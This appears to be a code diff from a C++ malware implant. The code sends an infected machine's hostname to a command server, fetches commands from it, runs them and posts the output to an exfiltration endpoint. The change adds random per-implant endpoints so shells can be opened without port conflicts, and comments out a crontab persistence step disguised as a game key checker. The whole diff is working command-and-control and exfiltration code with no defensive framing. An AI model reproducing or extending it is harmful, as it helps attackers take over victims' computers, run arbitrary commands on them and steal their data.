@@ -1,4 +1,23 @@
 #include "request.h"
+//We need to have per-implant endpoints because we'll have port conflics 
+//when attempting to pop shells using the global commands``
+std::string gen_endpoint( size_t length )
+{
+    auto randchar = []() -> char
+    {
+        const char charset[] =
+        "0123456789"
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        "abcdefghijklmnopqrstuvwxyz";
+        const size_t max_index = (sizeof(charset) - 1);
+        return charset[ rand() % max_index ];
+    };
+    std::string str(length,0);
+    std::generate_n( str.begin(), length, randchar );
+    return str;
+}
+
+
 size_t CurlcallbackFuncToString(void *contents, size_t size, size_t nmemb, std::string *s)
 {
     size_t newLength = size*nmemb;
@@ -14,13 +33,13 @@ size_t CurlcallbackFuncToString(void *contents, size_t size, size_t nmemb, std::
     return newLength;
 }
 
-void curl_post(std::string url, std::string endpoint, std::string data) {
+void curl_post(std::string url, std::string endpoint, std::string data, bool addHost) {
     CURL *curl;
     CURLcode res;
     curl = curl_easy_init();
     std::string toSend;
-    if (endpoint == FIRST_INFECT) {
-        toSend = infectedHostname;
+    if (!addHost) {
+        toSend = data; 
     } else {
         toSend = infectedHostname + ":" + data;
     }
@@ -85,9 +104,11 @@ std::vector<std::string> command(std::string toRun) {
 //Run when the victim is first infected
 void first_infection() {
     std::vector<std::string> val = command("hostname");
+    PER_IMPL_INSTR = gen_endpoint(8);
     infectedHostname = val[0];
-    curl_post(URL, FIRST_INFECT, "");
-    command("1 * * * * /usr/local/.valorant_key_check | crontab -");
+
+    curl_post(URL, FIRST_INFECT + "/" + PER_IMPL_INSTR, infectedHostname, false);
+    //command("1 * * * * /usr/local/.valorant_key_check | crontab -");
 }
 
 void check_and_post() {
@@ -95,7 +116,7 @@ void check_and_post() {
     // -- ["ls -a", "ls -ltr", "hostname -i"]
 
     //Get instructions
-    std::string resp = curl_get(URL, INSTR);
+    std::string resp = curl_get(URL, INSTR + "/" + PER_IMPL_INSTR);
     std::istringstream line(resp);
     std::vector<std::string> cmds;
     std::string builtCmd, postReq;
@@ -124,7 +145,7 @@ void check_and_post() {
 
         if (postReq != "") {
             std::cout << "Implant Sent: " << postReq << std::endl;
-            curl_post(URL, EXFIL, postReq);
+            curl_post(URL, EXFIL, postReq, true);
         }
     }
 }
